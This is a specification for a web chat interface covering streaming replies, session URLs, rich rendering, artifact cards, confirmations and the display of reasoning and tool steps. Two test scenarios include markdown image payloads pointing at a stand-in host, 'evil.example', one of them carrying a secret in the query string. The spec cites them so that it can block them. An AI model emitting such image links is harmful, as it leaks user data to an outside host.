# web-chat Specification

## Purpose
Text chat in the web UI with rich output and confirmations.

## Requirements

### Requirement: Text chat
The chat view SHALL send turns to `POST /api/v1/conversation/turns` with the cookie principal and `inputMode = text`, render `delta` events as they arrive, show `status` events, and continue the session with the returned session id. After the first turn of a new chat, the view's URL SHALL change to `/chat/{id}` of the new session. Opening `/chat/{id}` SHALL load that conversation from `GET /api/v1/conversations/{id}` and continue it when it is a web session.

#### Scenario: Streaming reply
- **WHEN** the user sends a message
- **THEN** the reply text appears incrementally as `delta` events arrive

#### Scenario: New conversation
- **WHEN** the user starts a new chat
- **THEN** the next turn is sent without `conversationId` and a new session is created

#### Scenario: URL follows the session
- **WHEN** the first turn of a new chat returns session id S
- **THEN** the URL is `/chat/S` and the conversation list shows S first

#### Scenario: Unknown conversation
- **WHEN** the user opens `/chat/{id}` for an id that returns 404
- **THEN** the view says the conversation was not found and offers a new chat

### Requirement: Rich output rendering
The chat SHALL render markdown, tables and code blocks. Images SHALL be rendered only for same-origin URLs; external image URLs in model output SHALL be rendered as plain links. For each `artifact` event of a turn, the chat SHALL show image artifacts inline and every other kind as a card with name and kind that opens the artifact viewer; cards SHALL stay with the message when the session is reopened.

#### Scenario: Exfiltration image
- **WHEN** a reply contains `![x](https://evil.example/?q=secret)`
- **THEN** no request to `evil.example` is made and the URL is shown as a link

#### Scenario: Image artifact inline
- **WHEN** a turn's stream carries an `artifact` event of kind `image`
- **THEN** the image is shown inline in that reply

#### Scenario: Model artifact card
- **WHEN** a turn's stream carries an `artifact` event of kind `model3d`
- **THEN** the reply shows a card that opens the 3D viewer

### Requirement: Confirmation in chat
When a turn ends with a pending action, the chat SHALL show the confirmation question including its reason, and the user's next message SHALL go through the normal confirmation flow (keyword or judge).

#### Scenario: Confirm by typing
- **WHEN** the chat shows a pending action and the user types "confirm"
- **THEN** the frozen action executes and the result is shown

### Requirement: Reasoning and tool steps
The chat SHALL show the `reasoning` events of a reply in a reasoning block above the reply text. The block SHALL be open while reasoning streams and SHALL collapse when the first `delta` of the reply arrives; the user SHALL be able to open and close it. The chat SHALL show `tool` events as a timeline of steps in the reply, one line per tool call with the tool's interface label (the tool id when no label exists), argument summary, state and duration, updated in place when the call ends. `status` events SHALL be shown in the same timeline. The "thinking" indicator SHALL be shown only until the first event of the turn arrives. Reasoning SHALL be rendered as plain text, never as markdown or HTML.

#### Scenario: Reasoning collapses
- **WHEN** a reply streams reasoning and then its first text delta
- **THEN** the reasoning block was open during reasoning and is collapsed once the text appears

#### Scenario: Tool step updates in place
- **WHEN** a `tool` event with state `running` is followed by the ending event with the same id and state `error`
- **THEN** the timeline shows one line for that call, now marked as failed

#### Scenario: Model without reasoning
- **WHEN** a turn produces no `reasoning` events
- **THEN** no reasoning block is shown

#### Scenario: Markup in reasoning
- **WHEN** reasoning text contains `![x](https://evil.example/a.png)`
- **THEN** it is shown as literal text and no request is made
